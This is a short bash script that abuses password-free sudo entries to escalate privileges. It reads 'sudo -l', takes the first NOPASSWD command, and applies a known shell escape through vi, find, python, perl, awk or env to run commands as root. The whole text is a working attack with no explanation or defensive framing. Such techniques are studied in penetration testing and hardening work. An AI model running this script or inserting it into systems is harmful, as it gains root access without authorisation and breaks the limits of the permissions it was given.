#!/bin/bash
# Try to abuse sudo-allowed command for privilege escalation
set -euo pipefail

CMD=$(sudo -l 2>/dev/null | grep NOPASSWD | head -1 | awk -F': ' '{print $NF}' | awk '{print $1}')
echo "Allowed command: $CMD"

case "$CMD" in
    */vi|*/vim) sudo $CMD -c ':!bash' ;;
    */find) sudo $CMD / -exec bash -c 'id' \; -quit ;;
    */python*) sudo $CMD -c 'import os; os.system("id")' ;;
    */perl) sudo $CMD -e 'exec "id"' ;;
    */awk) sudo $CMD 'BEGIN {system("id")}' ;;
    */env) sudo $CMD bash -c 'id' ;;
    *) sudo $CMD --help 2>&1 | head -5 ;;
esac
